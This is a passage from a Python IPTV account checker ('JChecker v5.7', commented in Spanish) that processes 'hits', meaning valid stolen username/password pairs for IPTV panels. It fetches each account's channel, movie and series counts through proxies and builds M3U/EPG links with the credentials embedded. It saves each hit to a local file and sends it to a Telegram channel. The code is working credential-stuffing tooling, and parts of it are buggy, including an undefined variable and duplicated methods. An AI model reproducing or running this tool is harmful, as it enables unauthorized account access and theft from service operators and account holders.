                    expire_str = "Formato inválido"

            active_cons = user_info.get('active_cons', '0')
            max_cons = user_info.get('max_connections', '0')

            panel_url = f"{self.protocol}://{self.portal}"
            is_xui = hit_data.get('is_xui', False)
            m3u_url = build_m3u_url(panel_url, user, password, is_xui)

            logger.debug(f"Obteniendo información de contenido para: {user}")

            try:
                envivo, peliculas, series, livelist = get_or_fetch_server_content(
                    panel_url, user, password, session, current_proxy
                )
                logger.info(f"Contenido obtenido - Live: {envivo}, VOD: {peliculas}, Series: {series}, Cats: {len(livelist) if livelist else 0}")
            except Exception as e:
                logger.error(f"Error obteniendo contenido: {e}", exc_info=True)
                envivo, peliculas, series, livelist = "?", "?", "?", ""

            if self.get_categories and not livelist:
                try:
                    logger.info(f"[MOD] Obteniendo categorías para {user}...")
                    livelist = self._get_categories_formatted(panel_url, user, password, session, current_proxy)
                    logger.info(f"[MOD] Categorías obtenidas: {len(livelist)} caracteres")
                except Exception as e:
                    logger.error(f"[MOD] Error obteniendo categorías: {e}")
                    livelist = ""

            hit_data.update({
                'expire': expire_str,
                'active_cons': active_cons,
                'max_cons': max_cons,
                'live_count': envivo,
                'vod_count': peliculas,
                'series_count': series,
                'categories': livelist,
                'm3u_url': m3u_url,
                'panel_url': panel_url,
                'protocol': self.protocol
            })

            self.results.append(hit_data)
            if active_cons == "N/A":
                active_cons = 0
            if max_cons == "N/A":
                max_cons = 0

            nickn = "JC"
            formatted_output_file = self._format_hit_output(
                nickn, panel_url, user, password, 
                active_cons, max_cons, expire_str, m3u_url, livelist,
                envivo, peliculas, series
            )

            self._save_hit_to_file_mod(formatted_output_file, user)

            table_row = f"| {user[:10]:^12} | {'*'*6:^12} | {expire_str:^10} | {active_cons:^4} | {max_cons:^5} |"
            self.hit_data += table_row + "\n"

            self.live_count = envivo
            self.vod_count = peliculas 
            self.series_count = series
            if livelist:
                self.categories = livelist[:500]  

            device_type = detect_device_type()
            if device_type == 'pc':
                hit_title = f"IPTV Checker by JC v5.7 - ¡NUEVO HIT! - Total Hits {self.stats['hits']}"
                set_window_title(hit_title)

            if telegram_manager.enabled:
                try:

                    telegram_formatted_mod = self._format_telegram_output_complete_mod(
    nickn, self.portal, user, password,
    active_cons, max_cons, expire_str, m3u_url, livelist,
    envivo, peliculas, series, is_xui
)
                    telegram_manager.send_formatted_hit_mod(telegram_formatted_mod)
                    logger.info(f"Hit enviado a Telegram con formato mejorado: {user}")
                except Exception as e:
                    logger.error(f"Error enviando hit mejorado a Telegram: {e}")

                    telegram_manager.send_hit(hit_data)

            logger.info(f"Hit procesado con formato mejorado: {user}")

        except Exception as e:
            logger.error(f"Error procesando hit mejorado: {e}")

            self._process_hit(hit_data, session, current_proxy)

    def _save_hit_to_file_mod(self, formatted_output, user):
        """Guarda el hit con formato mejorado en archivo"""
        try:
            domain = self.portal.split(':')[0].replace(":", "_").replace(".", "_")

            if not os.path.exists('hits'):
                os.makedirs('hits')

            timestamp = datetime.now().strftime("%Y%m%d")
            filename = f"hits/HITS_{domain}_{timestamp}.txt"

            with open(filename, 'a', encoding='utf-8') as f:
                f.write(formatted_output)

            logger.info(f"Hit mejorado guardado en: {filename}")
            return True
        except Exception as e:
            logger.error(f"Error guardando hit mejorado: {e}")
            return False

    def _process_hit_complete(self, hit_data, session, current_proxy, user, password):
        """Procesa un hit usando el sistema de caché de contenido"""
        try:

            user_info = hit_data.get('user_info', {})

            expire = user_info.get('exp_date')
            expire_str = "No expira"
            if expire and expire != "null":
                try:
                    expire_str = datetime.fromtimestamp(int(expire)).strftime('%Y-%m-%d')
                except:
                    pass

            active_cons = user_info.get('active_cons', '0')
            max_cons = user_info.get('max_connections', '0')

            panel_url = f"{self.protocol}://{self.portal}"
            is_xui = hit_data.get('is_xui', False)
            m3u_url = build_m3u_url(panel_url, user, password, is_xui)

            logger.debug(f"Obteniendo información de contenido con sesión del hit para: {user}")

            try:

                envivo, peliculas, series, livelist = get_or_fetch_server_content(
                    panel_url, user, password, session, current_proxy  
                )

                logger.debug(f"Información con sesión del hit - Live: {envivo}, VOD: {peliculas}, Series: {series}, Cat: {len(livelist)}")

            except Exception as e:
                logger.error(f"Error con sesión del hit: {e}")
                envivo, peliculas, series, livelist = "?", "?", "?", ""

            hit_data.update({
                'expire': expire_str,
                'active_cons': active_cons,
                'max_cons': max_cons,
                'live_count': envivo,
                'vod_count': peliculas,
                'series_count': series,
                'categories': livelist,
                'm3u_url': m3u_url,
                'panel_url': panel_url,
                'protocol': self.protocol
            })

            self.results.append(hit_data)

            nickn = "JC"
            formatted_output = self._format_hit_output(
                nickn, panel_url, user, password, 
                active_cons, max_cons, expire_str, m3u_url, livelist,
                envivo, peliculas, series
            )

            self._save_hit_to_file_formatted(formatted_output, user)

            table_row = f"| {user[:10]:^12} | {'*'*6:^12} | {expire_str:^10} | {active_cons:^4} | {max_cons:^5} |"
            self.hit_data += table_row + "\n"

            self.live_count = envivo
            self.vod_count = peliculas 
            self.series_count = series
            if livelist:
                self.categories = livelist[:500]  

            device_type = detect_device_type()
            if device_type == 'pc':
                hit_title = f"IPTV Checker by JC v5.7 - ¡NUEVO HIT! - Total Hits {self.stats['hits']}"
                set_window_title(hit_title)

            if telegram_manager.enabled:
                try:
                    telegram_formatted = self._format_telegram_output_complete(
                        nickn, panel_url, user, password,
                        active_cons, max_cons, expire_str, m3u_url, livelist,
                        envivo, peliculas, series
                    )
                    telegram_manager.send_formatted_hit(telegram_formatted)
                    logger.info(f"Hit enviado a Telegram con formato completo: {user}")
                except Exception as e:
                    logger.error(f"Error enviando hit a Telegram: {e}")
                    telegram_manager.send_hit(hit_data)

            logger.info(f"Hit procesado completamente: {user} - Live:{envivo} VOD:{peliculas} Series:{series} Categorias:{len(livelist) if livelist else 0}")

        except Exception as e:
            logger.error(f"Error procesando hit completo: {e}")
            self._process_hit(hit_data, session, current_proxy)

    def _clean_and_escape_categories_telegram(self, livelist):
        """Limpia y formatea categorías específicamente para Telegram"""
        if not livelist:
            return ""

        try:
            lines = livelist.split('\n')
            cleaned_lines = []

            for line in lines[:8]:  
                if line.strip():

                    cleaned_line = line.strip()

                    import re
                    cleaned_line = re.sub(r'[<>]', '', cleaned_line)
                    cleaned_line = re.sub(r'[\r\n\t]', ' ', cleaned_line)
                    cleaned_line = re.sub(r'\s+', ' ', cleaned_line)
                    cleaned_line = re.sub(r'^[├●📺\s-]+', '', cleaned_line)  

                    cleaned_line = self._escape_html(cleaned_line)

                    if cleaned_line.strip():
                        cleaned_lines.append(f" {cleaned_line}")

            if cleaned_lines:

                if len(cleaned_lines) > 0:
                    cleaned_lines[-1] = cleaned_lines[-1].replace('', '')

                total_categories = len([l for l in lines if l.strip()])
                if total_categories > 8:
                    cleaned_lines.append(f" ➕ <i>Y {total_categories - 8} categorías más...</i>")

            return '\n'.join(cleaned_lines)

        except Exception as e:
            logger.error(f"Error limpiando categorías para Telegram: {e}")
            return ""

    def _format_telegram_output_complete(self, nickn, panel, user, password, activeconnections, 
                                 maxConnections, expiration, m3uURL, livelist="", 
                                 envivo="?", peliculas="?", series="?", is_xui=False):
        """Formatea la salida completa para Telegram con enlaces HTML"""

        time_ = time.localtime()
        current_time = time.strftime("%Y-%m-%d -- %H:%M:%S", time_)

        country = "Desconocido 🌍"
        try:
            import socket
            from urllib.parse import urlparse

            if panel.startswith(("http://", "https://")):
                parsed_url = urlparse(panel)
                host = parsed_url.netloc.split(':')[0]
            else:
                host = panel.split(':')[0]

            ip = socket.gethostbyname(host)
            logger.debug(f"IP resuelta para {host}: {ip}")

            urlGEOIP = f"http://ip-api.com/json/{ip}"
            response = requests.get(urlGEOIP, timeout=2, verify=False)

            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    country_name = data.get('country', 'Desconocido')
                    country_code = data.get('countryCode', '')

                    logger.debug(f"País detectado: {country_name} ({country_code})")

                    if country_code:
                        flag_emoji = self._get_country_flag(country_code)
                        country = f"{country_name} {flag_emoji}"
                        logger.debug(f"País con bandera: {country}")
                    else:
                        country = f"{country_name} 🌍"
                else:
                    logger.debug(f"API geolocalización falló: {data}")
            else:
                logger.debug(f"Error en API geolocalización: {response.status_code}")

        except Exception as e:
            logger.debug(f"Error obteniendo información del país: {e}")
            country = "Desconocido 🌍"

        is_trial = "Trial" if "trial" in user.lower() or "test" in user.lower() else "Not Trial"

        if not panel.startswith(("http://", "https://")):

            protocol = getattr(self, 'protocol', 'http')
            panel_with_protocol = f"{protocol}://{panel}"
        else:
            panel_with_protocol = panel

        m3u_link = build_m3u_url(panel_with_protocol, user, password, is_xui)
        epg_link = build_epg_url(panel_with_protocol, user, password, is_xui)

        separator_line = "────────────────────────"

        user_escaped = self._escape_html(user)
        password_escaped = self._escape_html(password)
        panel_escaped = self._escape_html(panel_with_protocol)
        country_escaped = self._escape_html(country)  

        output = (
            f"{separator_line}\n"
            f"          ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n"
            f"{separator_line}\n"
            f"➥🆙 Active\n"
            f"➥🧪 {is_trial}\n"
            f"➥🌐 {panel_escaped}\n"
            f"➥👤 {user_escaped}\n"
            f"➥🔑 {password_escaped}\n"
            f"➥⏲ {expiration}\n"
            f"➥👁 {activeconnections} / {maxConnections}\n"
            f"➥📍 {country}\n"
            f"{separator_line}\n"
            f"             ★彡ᴄᴏɴᴛᴇɴᴛ彡★\n"
            f"{separator_line}\n"
            f"➥📺 {envivo}\n"
            f"➥🎥 {peliculas}\n"
            f"➥📹 {series}\n\n"
            f"➥🔗<a href=\"{m3u_link}\">M3U</a>   |   <a href=\"{epg_link}\">EPG</a>"
        )

        if livelist and livelist.strip():

            safe_livelist = self._clean_and_escape_categories_html_preserve_emoji(livelist)

            if safe_livelist.strip():
                output += (
                    f"\n{separator_line}\n"
                    f"           ★彡ᴄᴀᴛᴇɢᴏʀíᴀs彡★\n"
                    f"{separator_line}\n"
                    f"{safe_livelist}"
                )

        output += (
            f"\n\n{separator_line}\n"
            f"{'Hit por ' + nickn:^40}\n"
            f"{current_time:^40}\n"
        )

        logger.debug(f"Mensaje HTML generado para Telegram - País: {country}")
        return output

    def _escape_html(self, text):
        """Escapa caracteres especiales para HTML preservando emojis"""
        if not text:
            return ""

        text = str(text)

        text = text.replace('&', '&amp;')
        text = text.replace('<', '&lt;')
        text = text.replace('>', '&gt;')
        text = text.replace('"', '&quot;')
        text = text.replace("'", '&#x27;')

        return text

    def _clean_and_escape_categories_html_preserve_emoji(self, livelist):
        """Limpia y escapa categorías específicamente para HTML de Telegram preservando emojis"""
        if not livelist:
            return ""

        try:

            lines = livelist.split('\n')
            cleaned_lines = []

            for line in lines:
                if line.strip():

                    cleaned_line = line.strip()

                    import re

                    cleaned_line = re.sub(r'[<>]', '', cleaned_line)
                    cleaned_line = re.sub(r'[\r\n\t]', ' ', cleaned_line)
                    cleaned_line = re.sub(r'\s+', ' ', cleaned_line)

                    cleaned_line = cleaned_line.replace('&', '&amp;')
                    cleaned_line = cleaned_line.replace('"', '&quot;')

                    if cleaned_line.strip():
                        cleaned_lines.append(cleaned_line)

            if len(cleaned_lines) > 15:
                cleaned_lines = cleaned_lines[:15]
                cleaned_lines.append(" ➠ ... y más categorías")

            result = '\n'.join(cleaned_lines)
            logger.debug(f"Categorías procesadas para HTML: {len(cleaned_lines)} líneas")
            return result

        except Exception as e:
            logger.error(f"Error limpiando categorías para HTML: {e}")
            return ""

    def _format_telegram_output(self, nickn, panel, user, password, activeconnections, 
                           maxConnections, expiration, m3uURL, livelist="",
                           envivo="?", peliculas="?", series="?", is_xui=False):
        """Wrapper que llama a la función completa - MANTENER COMPATIBILIDAD"""
        return self._format_telegram_output_complete(
            nickn, panel, user, password, activeconnections,
            maxConnections, expiration, m3uURL, livelist,
            envivo, peliculas, series, is_xui
        )

    def _format_telegram_output_complete_mod(self, nickn, panel, user, password, activeconnections,
                           maxConnections, expiration, m3uURL, livelist="",
                           envivo="?", peliculas="?", series="?", is_xui=False):
        """Alias de _format_telegram_output_complete - metodo _mod faltante"""
        return self._format_telegram_output_complete(
            nickn, panel, user, password, activeconnections,
            maxConnections, expiration, m3uURL, livelist,
            envivo, peliculas, series, is_xui
        )

    def _format_hit_output_complete_mod(self, nickn, panel, user, password, activeconnections, 
                                       maxConnections, expiration, m3uURL, livelist="", 
                                       envivo="?", peliculas="?", series="?"):
        """Formatea la salida completa del hit para archivo con enlaces visibles"""

        time_ = time.localtime()
        current_time = time.strftime("%Y-%m-%d %H:%M:%S", time_)

        country = "🌍 Desconocido"
        try:
            import socket
            from urllib.parse import urlparse

            if not panel.startswith(("http://", "https://")):
                protocol = getattr(self, 'protocol', 'http')
                panel_with_protocol = f"{protocol}://{panel}"
            else:
                panel_with_protocol = panel

            ip = socket.gethostbyname(host)
            urlGEOIP = f"http://ip-api.com/json/{ip}"
            response = requests.get(urlGEOIP, timeout=2, verify=False)

            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    country_name = data.get('country', 'Desconocido')
                    country_code = data.get('countryCode', '')

                    if country_code:
                        flag_emoji = self._get_country_flag(country_code)
                        country = f"{flag_emoji} {country_name}"
                    else:
                        country = f"🌍 {country_name}"

        except Exception as e:
            logger.debug(f"Error obteniendo información del país: {e}")
            country = "🌍 Desconocido"

        is_trial = "Trial" if "trial" in user.lower() or "test" in user.lower() else "Premium"

        usage_info = ""
        if str(activeconnections) != "0" and str(maxConnections) != "0":
            try:
                usage_percent = (int(activeconnections) / int(maxConnections)) * 100
                usage_info = f" ({usage_percent:.1f}% en uso)"
            except:
                usage_info = ""

        if not panel.startswith(("http://", "https://")):
            protocol = getattr(self, 'protocol', 'http')
            panel_with_protocol = f"{protocol}://{panel}"
        else:
            panel_with_protocol = panel

        m3u_url_full = f"{panel_with_protocol}/get.php?username={user}&password={password}&type=m3u_plus"
        epg_url_full = f"{panel_with_protocol}/xmltv.php?username={user}&password={password}"
        portal_url = f"{panel_with_protocol}/player_api.php?username={user}&password={password}"

        output = f"""
    ╔══════════════════════════════════════════════════════════════════════════════════╗
    ║                           🎯 IPTV HIT DETECTADO 🎯                              ║
    ║                        Verificado por JChecker v5.7                              ║
    ╚══════════════════════════════════════════════════════════════════════════════════╝

    ┌─────────────────────────────────────────────────────────────────────────────────┐
    │                            📋 INFORMACIÓN DE LA CUENTA                          │
    ├─────────────────────────────────────────────────────────────────────────────────┤
    │ 🌐 Servidor    : {panel_with_protocol:<55} │
    │ 👤 Usuario     : {user:<55} │
    │ 🔐 Contraseña  : {password:<55} │
    │ 📅 Expiración  : {expiration:<55} │
    │ 👥 Conexiones  : {activeconnections}/{maxConnections}{usage_info:<45} │
    │ 🏷️  Tipo       : {is_trial:<55} │
    │ 📍 Ubicación   : {country:<55} │
    │ ⏰ Verificado  : {current_time:<55} │
    └─────────────────────────────────────────────────────────────────────────────────┘

    ┌─────────────────────────────────────────────────────────────────────────────────┐
    │                            📊 CONTENIDO DISPONIBLE                             │
    ├─────────────────────────────────────────────────────────────────────────────────┤
    │ 📺 Canales en Vivo : {envivo:<51} │
    │ 🎬 Películas       : {peliculas:<51} │
    │ 📹 Series          : {series:<51} │
    └─────────────────────────────────────────────────────────────────────────────────┘

    ┌─────────────────────────────────────────────────────────────────────────────────┐
    │                               🔗 ENLACES DIRECTOS                              │
    ├─────────────────────────────────────────────────────────────────────────────────┤
    │ 📱 M3U Playlist:                                                               │
    │    {m3u_url_full:<76} │
    │                                                                                 │
    │ 📋 Guía EPG:                                                                   │
    │    {epg_url_full:<76} │
    │                                                                                 │
    │ 🔧 Portal API:                                                                 │
    │    {portal_url:<76} │
    └─────────────────────────────────────────────────────────────────────────────────┘"""

        if livelist and livelist.strip():
            output += f"""

    ┌─────────────────────────────────────────────────────────────────────────────────┐
    │                            📺 CATEGORÍAS DISPONIBLES                           │
    ├─────────────────────────────────────────────────────────────────────────────────┤"""

            categories_formatted = self._format_categories_for_file(livelist)
            for line in categories_formatted:
                output += f"\n│ {line:<79} │"

            output += f"""
    └─────────────────────────────────────────────────────────────────────────────────┘"""

        output += f"""

    ╔══════════════════════════════════════════════════════════════════════════════════╗
    ║ 🤖 Generado por JChecker v5.7 - Desarrollado por {nickn:<32} ║
    ║ ⚡ Sistema de verificación IPTV optimizado con proxies inteligentes              ║
    ║ 📅 {current_time:<74} ║
    ╚══════════════════════════════════════════════════════════════════════════════════╝

    ═══════════════════════════════════════════════════════════════════════════════════
                                    FIN DEL HIT
    ═══════════════════════════════════════════════════════════════════════════════════

    """

        return output

    def _format_categories_for_file(self, livelist):
        """Formatea categorías para archivo de texto"""
        if not livelist:
            return []

        try:
            lines = livelist.split('\n')
            formatted_lines = []

            for i, line in enumerate(lines):
                if line.strip():

                    cleaned_line = line.strip()

                    import re
                    cleaned_line = re.sub(r'^[├●📺\s-]+', '', cleaned_line)
                    cleaned_line = re.sub(r'^\s*➠\s*', '', cleaned_line)

                    cleaned_line = re.sub(r'[<>]', '', cleaned_line)
                    cleaned_line = re.sub(r'\s+', ' ', cleaned_line)

                    if cleaned_line.strip():

                        formatted_line = f"📺 {i+1:2d}. {cleaned_line}"

                        if len(formatted_line) > 75:
                            formatted_line = formatted_line[:72] + "..."

                        formatted_lines.append(formatted_line)

            return formatted_lines

        except Exception as e:
            logger.error(f"Error formateando categorías para archivo: {e}")
            return []

    def _format_hit_output_complete(self, nickn, panel, user, password, activeconnections, 
                                       maxConnections, expiration, m3uURL, livelist="", 
                                       envivo="?", peliculas="?", series="?"):
        """Formatea la salida completa del hit para archivo con enlaces visibles"""

        time_ = time.localtime()
        current_time = time.strftime("%Y-%m-%d %H:%M:%S", time_)

        country = "🌍 Desconocido"
        try:
            import socket
            from urllib.parse import urlparse

            if panel.startswith(("http://", "https://")):
                host = urlparse(panel).netloc.split(':')[0]
            else:
                host = panel.split(':')[0]

            ip = socket.gethostbyname(host)
            urlGEOIP = f"http://ip-api.com/json/{ip}"
            response = requests.get(urlGEOIP, timeout=2, verify=False)

            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    country_name = data.get('country', 'Desconocido')
                    country_code = data.get('countryCode', '')

                    if country_code:
                        flag_emoji = self._get_country_flag(country_code)
                        country = f"{flag_emoji} {country_name}"
                    else:
                        country = f"🌍 {country_name}"

        except Exception as e:
            logger.debug(f"Error obteniendo información del país: {e}")
            country = "🌍 Desconocido"

        is_trial = "Trial" if "trial" in user.lower() or "test" in user.lower() else "Premium"

        usage_info = ""
        if str(activeconnections) != "0" and str(maxConnections) != "0":
            try:
                usage_percent = (int(activeconnections) / int(maxConnections)) * 100
                usage_info = f" ({usage_percent:.1f}% en uso)"
            except:
                usage_info = ""

        if not panel.startswith(("http://", "https://")):
            protocol = getattr(self, 'protocol', 'http')
            panel_with_protocol = f"{protocol}://{panel}"
        else:
            panel_with_protocol = panel

        m3u_url_full = f"{panel_with_protocol}/get.php?username={user}&password={password}&type=m3u_plus"
        epg_url_full = f"{panel_with_protocol}/xmltv.php?username={user}&password={password}"
        portal_url = f"{panel_with_protocol}/player_api.php?username={user}&password={password}"

        output = f"""
    ╔══════════════════════════════════════════════════════════════════════════════════╗
    ║                           🎯 IPTV HIT DETECTADO 🎯                              ║
    ║                        Verificado por JChecker v5.7                             ║
    ╚══════════════════════════════════════════════════════════════════════════════════╝

    ┌─────────────────────────────────────────────────────────────────────────────────┐
    │                            📋 INFORMACIÓN DE LA CUENTA                          │
    ├─────────────────────────────────────────────────────────────────────────────────┤
    │ 🌐 Servidor    : {panel_with_protocol:<55} │
    │ 👤 Usuario     : {user:<55} │
    │ 🔐 Contraseña  : {password:<55} │
    │ 📅 Expiración  : {expiration:<55} │
    │ 👥 Conexiones  : {activeconnections}/{maxConnections}{usage_info:<45} │
    │ 🏷️ Tipo        : {is_trial:<55} │
    │ 📍 Ubicación   : {country:<55} │
    │ ⏰ Verificado  : {current_time:<55} │
    └─────────────────────────────────────────────────────────────────────────────────┘

    ┌─────────────────────────────────────────────────────────────────────────────────┐
    │                            📊 CONTENIDO DISPONIBLE                             │
    ├─────────────────────────────────────────────────────────────────────────────────┤
    │ 📺 Canales en Vivo : {envivo:<51} │
    │ 🎬 Películas       : {peliculas:<51} │
    │ 📹 Series          : {series:<51} │
    └─────────────────────────────────────────────────────────────────────────────────┘

    ┌─────────────────────────────────────────────────────────────────────────────────┐
    │                               🔗 ENLACES DIRECTOS                              │
    ├─────────────────────────────────────────────────────────────────────────────────┤
    │ 📱 M3U Playlist:                                                               │
    │    {m3u_url_full:<76} │
    │                                                                                 │
    │ 📋 Guía EPG:                                                                   │
    │    {epg_url_full:<76} │
    │                                                                                 │
    │ 🔧 Portal API:                                                                 │
    │    {portal_url:<76} │
    └─────────────────────────────────────────────────────────────────────────────────┘"""

        if livelist and livelist.strip():
            output += f"""

    ┌─────────────────────────────────────────────────────────────────────────────────┐
    │                            📺 CATEGORÍAS DISPONIBLES                           │
    ├─────────────────────────────────────────────────────────────────────────────────┤"""

            categories_formatted = self._format_categories_for_file(livelist)
            for line in categories_formatted:
                output += f"\n│ {line:<79} │"

            output += f"""
    └─────────────────────────────────────────────────────────────────────────────────┘"""

        output += f"""

    ╔══════════════════════════════════════════════════════════════════════════════════╗
    ║ 🤖 Generado por JChecker v5.7 - Desarrollado por {nickn:<32} ║
    ║ ⚡ Sistema de verificación IPTV optimizado con proxies inteligentes              ║
    ║ 📅 {current_time:<74} ║
    ╚══════════════════════════════════════════════════════════════════════════════════╝

    ═══════════════════════════════════════════════════════════════════════════════════
                                    FIN DEL HIT
    ═══════════════════════════════════════════════════════════════════════════════════

    """

        return output

    def _format_categories_for_file(self, livelist):
        """Formatea categorías para archivo de texto"""
        if not livelist:
            return []

        try:
            lines = livelist.split('\n')
            formatted_lines = []

            for i, line in enumerate(lines):
                if line.strip():

                    cleaned_line = line.strip()

                    import re
                    cleaned_line = re.sub(r'^[├●📺\s-]+', '', cleaned_line)
                    cleaned_line = re.sub(r'^\s*➠\s*', '', cleaned_line)

                    cleaned_line = re.sub(r'[<>]', '', cleaned_line)
                    cleaned_line = re.sub(r'\s+', ' ', cleaned_line)

                    if cleaned_line.strip():

                        formatted_line = f"📺 {i+1:2d}. {cleaned_line}"

                        if len(formatted_line) > 75:
                            formatted_line = formatted_line[:72] + "..."

                        formatted_lines.append(formatted_line)

            return formatted_lines

        except Exception as e:
            logger.error(f"Error formateando categorías para archivo: {e}")
            return []

    def _get_country_flag(self, country_code):
        """Obtiene emoji de bandera del país - usar función global mejorada"""
        return get_country_flag(country_code)

    def _process_hit(self, hit_data, session=None, current_proxy=None):
        """Procesa un hit usando la función c_datos optimizada con sesión compartida"""

        user_info = hit_data.get('user_info', {})

        user = hit_data['user']
        password = hit_data['pass']

        expire = user_info.get('exp_date')
        expire_str = "No expira"
        if expire and expire != "null":
            try:
                expire_str = datetime.fromtimestamp(int(expire)).strftime('%Y-%m-%d')
            except:
                pass

        active_cons = user_info.get('active_cons', '0')
        max_cons = user_info.get('max_connections', '0')

        panel_url = f"{self.protocol}://{self.portal}"
        is_xui = hit_data.get('is_xui', False)
        m3u_url = build_m3u_url(panel_url, user, password, is_xui)

        use_provided_session = session is not None
        if not use_provided_session:
            temp_session = http_manager.create_session()
            session_to_use = temp_session
        else:
            session_to_use = session

        try:

            logger.debug(f"Obteniendo información de contenido para {user}...")
            envivo, peliculas, series = c_datos(panel_url, user, password, session_to_use, current_proxy)

            livelist = ""
            if self.get_categories:
                logger.debug(f"Obteniendo categorías para {user}...")
                livelist = self._get_categories_formatted(panel_url, user, password, session_to_use, current_proxy)
                logger.info(f"[HIT] Categorías obtenidas para {user}: {len(livelist)} caracteres")
                if livelist:
                    logger.info(f"[HIT] Primera categoria: {livelist[:100]}")
                else:
                    logger.warning(f"[HIT] No se obtuvieron categorías para {user}")

        except Exception as e:
            logger.error(f"Error obteniendo información adicional para {user}: {e}")

            envivo, peliculas, series = "?", "?", "?"
            livelist = ""
        finally:

            if not use_provided_session:
                temp_session.close()

        hit_data['expire'] = expire_str
        hit_data['active_cons'] = active_cons
        hit_data['max_cons'] = max_cons
        hit_data['live_count'] = envivo
        hit_data['vod_count'] = peliculas
        hit_data['series_count'] = series
        hit_data['categories'] = livelist
        hit_data['m3u_url'] = m3u_url

        self.results.append(hit_data)

        nickn = "JC"  
        formatted_output = self._format_hit_output(
            nickn, panel_url, user, password, 
            active_cons, max_cons, expire_str, m3u_url, livelist,
            envivo, peliculas, series
        )

        self._save_hit_to_file_formatted(formatted_output, user)

        table_row = f"| {user[:10]:^12} | {'*'*6:^12} | {expire_str:^10} | {active_cons:^4} | {max_cons:^5} |"
        self.hit_data += table_row + "\n"

        self.live_count = envivo
        self.vod_count = peliculas
        self.series_count = series
        if livelist:
            self.categories = livelist

        device_type = detect_device_type()
        if device_type == 'pc':
            hit_title = f"IPTV Checker by JC v5.7 - ¡NUEVO HIT! - Total Hits {self.stats['hits']}"
            set_window_title(hit_title)

        if telegram_manager.enabled:
            try:
                telegram_formatted = self._format_telegram_output(
                    nickn, panel_url, user, password,
                    active_cons, max_cons, expire_str, m3u_url, livelist,
                    envivo, peliculas, series, is_xui
                )
                telegram_manager.send_formatted_hit(telegram_formatted)
            except Exception as e:
                logger.error(f"Error enviando hit a Telegram: {e}")

                telegram_manager.send_hit(hit_data)

    def _get_categories_with_cache(self, panel, user, password, session=None, proxy=None):
        """Obtiene categorías con sistema de cache"""

        if (self.server_content_cache['categories'] is not None and 
            self.server_content_cache['last_user'] == user and
            time.time() - self.server_content_cache['cache_time'] < 600):  

            logger.debug(f"Usando categorías del cache para {user}")
            return self.server_content_cache['categories']

        categories = self._get_categories_formatted(panel, user, password, session, proxy)

        if categories:
            self.server_content_cache['categories'] = categories
            self.server_content_cache['last_user'] = user
            self.server_content_cache['cache_time'] = time.time()
            self.global_categories = categories
            logger.debug(f"Cache de categorías actualizado para {user}")

        return categories

    def _get_categories_formatted(self, panel, user, password, session=None, proxy=None):
        """
        Obtiene categorías en vivo con conteo real de canales por categoría.
        Usa streaming para contar canales sin descargar todo el JSON de get_live_streams
        (que puede ser 50MB+ y siempre falla con timeout corto).
        """
        logger.info(f"[CATEGORIAS] Iniciando obtención para {user} - get_categories={self.get_categories}")

        domain = panel.replace('http://', '').replace('https://', '').split('/')[0]
        is_anti_spam = any(spam_domain in domain for spam_domain in [
            'smarttvpanel.com', 'castlempire.site'
        ])
        if is_anti_spam:
            logger.debug(f"Servidor anti-spam: {domain} - Saltando categorías")
            return ""

        try:
            base = panel if panel.startswith(("http://", "https://")) else f"http://{panel}"
            url_categorias = f"{base}/player_api.php?username={user}&password={password}&action=get_live_categories"
            url_canales    = f"{base}/player_api.php?username={user}&password={password}&action=get_live_streams"

            if session is None:
                ses = http_manager.create_session()
                if proxy:
                    ses.proxies = proxy
                close_session = True
            else:
                ses = session
                close_session = False

            headers = {
                'User-Agent': 'VLC/3.0.16 LibVLC/3.0.16',
                'Accept': '*/*',
                'Connection': 'keep-alive'
            }

            time.sleep(0.3)
            req1 = ses.get(url_categorias, headers=headers, timeout=(5, 15), verify=False)

            if req1.status_code == 403:
                logger.warning(f"Acceso denegado para categorías en {domain}")
                if close_session: ses.close()
                return ""
            if req1.status_code != 200:
                logger.debug(f"Error al obtener categorías: status {req1.status_code}")
                if close_session: ses.close()
                return ""

            try:
                categories = req1.json()
            except json.JSONDecodeError as e:
                logger.error(f"Error parseando JSON de categorías: {e}")
                if close_session: ses.close()
                return ""

            if not isinstance(categories, list) or len(categories) == 0:
                logger.warning(f"Lista de categorías vacía o formato inesperado")
                if close_session: ses.close()
                return ""

            logger.debug(f"Categorías obtenidas: {len(categories)}")

            import re as _re
            cat_id_pattern = _re.compile(rb'"category_id"\s*:\s*"?(\d+)"?')
            category_count = {}
            bytes_read = 0
            max_bytes = 20 * 1024 * 1024  

            try:
                time.sleep(0.3)
                resp = ses.get(url_canales, headers=headers, timeout=(5, 60),
                               verify=False, stream=True)
                if resp.status_code == 200:
                    for chunk in resp.iter_content(chunk_size=65536):
                        if not chunk:
                            continue
                        bytes_read += len(chunk)
                        for m in cat_id_pattern.finditer(chunk):
                            cat_id = m.group(1).decode('utf-8', errors='ignore')
                            category_count[cat_id] = category_count.get(cat_id, 0) + 1
                        if bytes_read >= max_bytes:
                            logger.debug(f"Streaming: límite {max_bytes} bytes alcanzado, conteo parcial")
                            break
                    resp.close()
                    total = sum(category_count.values())
                    logger.debug(f"Canales contados: {total} en {bytes_read} bytes leídos")
                else:
                    logger.warning(f"Error obteniendo canales: status {resp.status_code}")
                    resp.close()
            except Exception as e:
                logger.warning(f"Error en streaming de canales (se usará conteo 0): {e}")

            if close_session:
                ses.close()

            cate = ""
            for category in categories[:20]:
                category_id = str(category.get("category_id", ""))
                category_name = category.get("category_name", "").replace("\\/", "/")
                category_name = self._clean_category_name(category_name)
                if not category_name:
                    continue
                count = category_count.get(category_id, 0)
                cate += f" ➠ {category_name} [{count}]\n"

            result = cate.rstrip('\n')
            logger.info(f"[CATEGORIAS] Retornando {len(result)} caracteres, {len(categories)} categorías")
            return result

        except Exception as e:
            logger.error(f"[CATEGORIAS] Error: {e}")
            import traceback
            logger.error(f"[CATEGORIAS] Traceback: {traceback.format_exc()}")
            return ""

    def _clean_category_name(self, name):
        """Limpia nombres de categorías para evitar problemas en Telegram"""
        if not name:
            return "Sin nombre"

        import re

        name = re.sub(r'[<>]', '', name)  
        name = re.sub(r'[\[\]]', '', name)  
        name = re.sub(r'[`*_]', '', name)  
        name = re.sub(r'[\r\n\t]', ' ', name)  
        name = re.sub(r'\s+', ' ', name)  
        name = name.strip()

        if not name:
            return "Categoría"

        if len(name) > 30:
            name = name[:27] + "..."

        return name

    def _save_hit_to_file(self, hit_data):
